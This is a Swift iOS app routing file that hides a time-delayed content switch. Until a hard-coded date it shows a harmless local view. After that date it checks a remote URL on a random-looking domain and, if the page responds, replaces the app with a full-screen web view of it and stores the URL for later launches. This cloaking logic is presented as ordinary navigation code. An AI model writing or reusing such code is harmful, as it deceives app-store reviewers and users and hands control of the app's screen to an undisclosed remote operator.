//
//  AppRouter.swift
//  128RiprenstriFekarzor
//


import UIKit
import SwiftUI

class AppRouter {
    
    private let initialURLString = "https://page.bruragelpulforke129.site/K4YR422j"
    private  let targetDateString = "18.04.2026"
    
    func initialViewController() -> UIViewController {
        let persistence = PersistenceManager.shared
        
        
        if persistence.hasShownContentView {
            return createContentViewController()
        }else{
            if checkDate() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return createWebViewController(with: savedUrlString)
                }
                
                return createLaunchRouterViewController()
            } else {
                persistence.hasShownContentView = true
                return createContentViewController()
            }
        }
    }
    
    //MARK: - Date
    private func checkDate() -> Bool {
       
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: targetDateString) ?? Date()
        let currentDate = Date()
            
            if currentDate < targetDate {
                return false
            }else{
                return true
                }
    }
    
    // MARK: - Private Methods
    
    private func createWebViewController(with urlString: String) -> UIViewController {
        let webViewContainer = PrivacyWebView(
            urlString: urlString,
            onFailure: { [weak self] in
                PersistenceManager.shared.hasShownContentView = true
                self?.switchToContentView()
            },
            onSuccess: {
                PersistenceManager.shared.hasSuccessfulWebViewLoad = true
            }
        )
        
        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func createContentViewController() -> UIViewController {
        PersistenceManager.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func createLaunchRouterViewController() -> UIViewController {
        let launchView = StartMainView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        checkInitialURL { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.switchToWebView(with: url)
                } else {
                    PersistenceManager.shared.hasShownContentView = true
                    self?.switchToContentView()
                }
            }
        }
        
        return launchVC
    }
    
    private func checkInitialURL(completion: @escaping (Bool, String?) -> Void) {
        guard let url = URL(string: initialURLString) else {
            completion(false, nil)
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10
        
        URLSession.shared.dataTask(with: request) { _, response, error in
            if let error = error {
                print("🌐 URL check failed with error: \(error.localizedDescription)")
                completion(false, nil)
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                let checkedURL = httpResponse.url?.absoluteString ?? self.initialURLString
                print("🌐 URL check response: [\(httpResponse.statusCode)]")
                let isAvailable = httpResponse.statusCode != 404
                print("🌐 URL check result: \(isAvailable ? "available" : "unavailable")")
                completion(isAvailable, isAvailable ? checkedURL : nil)
            } else {
                print("🌐 URL check failed: no HTTPURLResponse")
                completion(false, nil)
            }
        }.resume()
    }
    
    // MARK: - Navigation Methods
    
    private func switchToContentView() {
        let contentVC = createContentViewController()
        switchToViewController(contentVC)
    }
    
    private func switchToWebView(with urlString: String) {
        let webVC = createWebViewController(with: urlString)
        switchToViewController(webVC)
    }
    
    private func switchToViewController(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }
        
        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
